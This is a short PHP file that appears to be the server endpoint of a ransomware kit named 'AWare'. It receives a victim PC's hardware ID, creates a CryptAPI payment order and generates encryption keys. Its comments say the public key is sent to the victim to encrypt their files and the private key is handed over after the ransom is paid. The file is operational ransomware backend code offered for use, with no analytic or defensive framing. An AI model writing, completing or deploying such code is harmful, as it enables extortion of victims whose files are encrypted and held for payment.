<?php

require_once 'inc/bootstrap.php';

$AWare = new AWare(new CryptAPI());

# The cache where the PC Identifier and encryption keys will be stored (contains restricted access)
$AWare->DefineJsonCachePaths('temp/cache.json');

#If the server receives a HWID from PC
if (isset($_GET['HWID_PC']))
{
    /*
        This method will generate the order in CryptAPI + private/public encryption keys, 
        the public key will be sent to the victim, and their files will be encrypted with it, 
        when the victim pays the ransom the private key will be given to him and he will be removed from the cache
    */
    ExitMessage($AWare->GetRansomInformationVictim($_GET['HWID_PC']));
}